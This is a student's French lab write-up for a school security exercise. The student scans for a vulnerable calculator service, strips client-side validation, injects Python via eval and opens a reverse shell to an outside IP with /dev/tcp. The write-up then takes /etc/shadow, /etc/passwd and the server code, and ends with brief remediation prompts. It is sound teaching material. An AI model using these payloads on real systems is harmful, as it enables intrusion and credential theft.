# TP5 : Exploit, pwn, fix


![Gunna be hax](./img/gunna_be_hacker.png)

## Sommaire

- [TP5 : Exploit, pwn, fix](#tp5--exploit-pwn-fix)
  - [Sommaire](#sommaire)
  - [0. Setup](#0-setup)
  - [1. Reconnaissance](#1-reconnaissance)
  - [2. Exploit](#2-exploit)
  - [3. Reverse shell](#3-reverse-shell)
  - [II. Remédiation](#ii-remédiation)

## 0. Setup

## 1. Reconnaissance


🌞 **Déterminer**

- à quelle IP ce client essaie de se co quand on le lance : 10.1.2.12

- à quel port il essaie de se co sur cette IP : 13337

Afin de pouvoir lancer le fichier client.py, il faut créer le dossier /var/log/bs_client, pour ensuite mettre le fichier client.py dedans. Il faut aussi créer un fichier bs_client.log afin de voir le retour du serveur. Lorsque nous lançons l'application client.py, nous pouvons ouvrir un wireshark et filtrer par tcp afin de voir sur quelle port et quelle addresse ip se connecte le client.


➜ **On me dit à l'oreillette que cette app est actuellement hébergée au sein de l'école.**

🌞 **Scanner le réseau**

- trouvez une ou plusieurs machines qui héberge une app sur ce port
- votre scan `nmap` doit être le plus discret possible : il ne teste que ce port là, rien d'autres

```bash
m4ul@thinkpad:~/Desktop$ sudo nmap -sS 10.33.64.0/20 -p 13337 --open
Starting Nmap 7.80 ( https://nmap.org ) at 2023-11-30 10:50 CET
Nmap scan report for 10.33.66.165
Host is up (0.0068s latency).

PORT      STATE SERVICE
13337/tcp open  unknown
MAC Address: 56:4C:81:26:BF:C8 (Unknown)

Nmap scan report for 10.33.70.40
Host is up (0.089s latency).

PORT      STATE SERVICE
13337/tcp open  unknown
MAC Address: E4:B3:18:48:36:68 (Intel Corporate)

Nmap scan report for 10.33.76.195
Host is up (0.0077s latency).

PORT      STATE SERVICE
13337/tcp open  unknown
MAC Address: 82:30:BF:B6:57:2F (Unknown)

Nmap scan report for 10.33.76.217
Host is up (0.0064s latency).

PORT      STATE SERVICE
13337/tcp open  unknown
MAC Address: 2C:6D:C1:5E:41:6A (Unknown)

Nmap done: 4096 IP addresses (869 hosts up) scanned in 246.11 seconds
```


🦈 **tp5_nmap.pcapng**


🌞 **Connectez-vous au serveur**


[Fichier client modifié](/client.py)

## 2. Exploit

➜ **On est face à une application qui, d'une façon ou d'une autre, prend ce que le user saisit, et l'évalue.**

🌞 **Injecter du code serveur**

En lisant le code client non modifié, nous pouvons voir que c'est bien ce code qui verifie ce que nous voulions envoyer au serveur. En mettant donc les matchs de regex en commentaire, nous pouvons maintenant envoyer ce qu'on veut au serveur.

```python
#   match= re.match(pattern, userMessage)
  #  if match:
   #     num1, operator, num2 = match.groups()
    #    num1, num2 = int(num1), int(num2)

        # Vérifiez si les nombres sont dans la plage [-100000, 100000]
    if True:
        s.sendall(userMessage.encode("utf-8"))
        logger.info("Message envoyé au serveur %s : %s", host, userMessage)
        #else:
         #   raise ValueError("l'opération autorisée n'accepte que des nombres entiers compris entre -100000 et +100000")
  #  else:
   #     raise ValueError("l'opération autorisée n'accepte que les signes suivants (-,+,*) et des nombres entiers compris entre -100000 et +100000")
```

Nous pouvons maintenant essayer d'envoyer une commande au serveur pour qu'il puisse nous envoyer un ping:

```
$ sudo python3 client.py
Veuillez saisir une opération arithmétique : __import__('os').system('ping -c 1 10.33.70.30')
```

## 3. Reverse shell

➜ **Injecter du code c'est bien mais...**



🌞 **Obtenez un reverse shell sur le serveur**

```
$ sudo python3 client.py
Veuillez saisir une opération arithmétique : __import__('os').system('sh -i >& /dev/tcp/10.33.67.140/6969 0>&1')
```

🌞 **Pwn**

- voler les fichiers [`/etc/shadow`](shadow) et [`/etc/passwd`](passwd)

Afin de retrouver le code serveur, j'ai listé tous les processus en cours:

```
sh-5.1# ps -ef
ps -ef
UID          PID    PPID  C STIME TTY          TIME CMD
root        2312       1  0 11:46 ?        00:00:00 /usr/bin/python3.9 /opt/serv.py
root        2364    2312  0 11:55 ?        00:00:00 sh -c sh -i >& /dev/tcp/10.33.67.140/6969 0>&1
```

- voler le [code](serv.py) serveur de l'application 


- déterminer si d'autres services sont disponibles sur la machine:

On voit qu'il n'y a que le service sshd qui est disponible en plus du serveur python
```
sh-5.1# ss -ltunp
ss -ltunp
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                             
tcp   LISTEN 0      1          10.0.3.15:13337      0.0.0.0:*    users:(("python3.9",pid=2312,fd=4))
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*    users:(("sshd",pid=699,fd=3))      
tcp   LISTEN 0      128             [::]:22            [::]:*    users:(("sshd",pid=699,fd=4)) 
```



## II. Remédiation

🌞 **Proposer une remédiation dév**

- le code serveur ne doit pas exécuter n'importe quoi
- il faut préserver la fonctionnalité de l'outil

🌞 **Proposer une remédiation système**

- l'environnement dans lequel tourne le service est foireux (le user utilisé ?)
- la machine devrait bloquer les connexions sortantes (pas de reverse shell possible)
